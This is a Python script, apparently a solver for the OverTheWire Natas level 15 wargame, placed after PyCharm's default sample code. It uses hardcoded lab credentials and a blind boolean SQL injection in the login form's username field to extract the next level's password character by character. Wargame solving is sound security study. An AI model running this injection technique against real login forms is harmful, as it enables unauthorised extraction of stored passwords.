# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

# See PyCharm help at https://www.jetbrains.com/help/pycharm/




import requests
from requests.auth import HTTPBasicAuth

# Fill in your details here to be posted to the login form.
payload = {'username': 'natas15', 'password': 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'}

all_char="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Use 'with' to ensure the session context is closed after use.
valid_char=[]
with requests.Session() as s:
    p = s.post('http://natas15.natas.labs.overthewire.org/', auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    # print the html returned or something more intelligent to see if it's a successful login page.
    print(p.text)

    for c in all_char:

        us = 'natas16" and BINARY password like \'%'+c+'%\'"'

        # An authorised request.
        r = s.post("http://natas15.natas.labs.overthewire.org/index.php?debug=True",data={"username":us},auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if "doesn't" not in r.text:
            valid_char.append(c)
            print(valid_char)
    pass2=''
    while True:
        for l in valid_char:
            k=''
            k=pass2+l
            us = 'natas16" and BINARY password like \'' + k + '%\'"'

            # An authorised request.
            r = s.post("http://natas15.natas.labs.overthewire.org/index.php?debug=True", data={"username": us},
                       auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
            if "doesn't" not in r.text:
                print(k)
                pass2=pass2+l
                print(pass2)


            us2 = 'natas16" and BINARY password like \'%' + k + '\'"'

            # An authorised request.
            r2 = s.post("http://natas15.natas.labs.overthewire.org/index.php?debug=True", data={"username": us2},
                       auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
            if "doesn't" not in r2.text and "doesn't" not in r.text:
                break


print(pass2)

